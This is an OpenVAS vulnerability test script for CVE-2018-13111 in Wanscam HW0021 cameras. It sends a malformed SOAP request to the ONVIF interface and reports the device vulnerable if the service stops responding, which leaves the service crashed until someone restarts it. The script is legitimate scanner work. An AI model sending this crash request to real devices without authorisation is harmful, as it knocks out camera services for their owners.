###############################################################################
# OpenVAS Vulnerability Test
#
# Wanscam HW0021 ONVIF Denial of Service Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113222");
  script_version("2019-08-30T12:32:13+0000");
  script_tag(name:"last_modification", value:"2019-08-30 12:32:13 +0000 (Fri, 30 Aug 2019)");
  script_tag(name:"creation_date", value:"2018-07-03 11:23:57 +0200 (Tue, 03 Jul 2018)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_cve_id("CVE-2018-13111");

  script_name("Wanscam HW0021 ONVIF Denial of Service Vulnerability");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Wanscam HW0021 devices are prone to a partial Denial of Service vulnerability.

  CAUTION: If the device is vulnerable, the ONVIF service will crash during the test.
  A manual restart of the service or the device will be necessary.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP POST and checks whether
  the remote host stops responding.");

  script_tag(name:"insight", value:"An invalid SOAP-request to the ONVIF-SOAP interface will cause the ONVIF
  service to crash.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to deny users access to the
  ONVIF interface, until the service is manually restarted.");

  script_tag(name:"affected", value:"Wanscam HW0021. Other devices using ONVIF may be affected, too.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://hackinganarchy.wordpress.com/2018/09/20/cve-2018-13111/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default: 8080 );

res = http_get_cache( port: port, item: "/" );
if( ! res || res !~ 'www.onvif.org' )
  exit( 0 );

vtstrings = get_vt_strings();
req = http_post_req( port: port, url: "/", add_headers: make_array("SOAPAction", vtstrings["lowercase"] ) );

# We can't use receive here, because if vulnerable, the service will crash, and a receive would cause the NVT to timeout.
soc = http_open_socket( port );
if( ! soc )
  exit( 0 );

send( socket: soc, data: req );
http_close_socket( soc );

soc = http_open_socket( port );
if( ! soc ) {
  report = "It was possible to crash the ONVIF service on the target device.";
  security_message( data: report, port: port );
  exit( 0 );
}

req = http_get_req( port: port, url: "/" );
send( socket: soc, data: req, length: strlen(req) );
answ = recv( socket: soc, length: 4096, timeout: 10 );
if( ! answ) {
  report = "It was possible to crash the ONVIF service on the target device.";
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
